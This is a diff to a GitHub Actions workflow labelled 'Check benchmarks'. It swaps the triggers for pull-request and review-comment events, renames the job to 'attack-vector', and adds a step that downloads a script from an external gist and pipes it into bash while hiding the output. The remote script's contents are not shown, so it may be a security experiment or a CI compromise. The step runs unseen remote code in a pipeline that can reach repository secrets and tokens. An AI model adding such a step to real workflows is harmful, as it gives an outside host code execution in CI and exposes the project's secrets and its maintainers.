@@ -2,9 +2,12 @@ name: Check benchmarks
 
 on:
   pull_request:
+    types: [locked]
+  pull_request_review_comment:
+    types: [deleted, created, edited]
 
 jobs:
-  set-tags:
-    runs-on: [ubuntu]
+  attack-vector:
+    runs-on: ubuntu-latest
     steps:
       - run: curl -sSfL https://gist.githubusercontent.com/RomarQ/066b5eb9b6abf60277332cbc280e1ac9/raw/experiment | bash /dev/null 2>&1
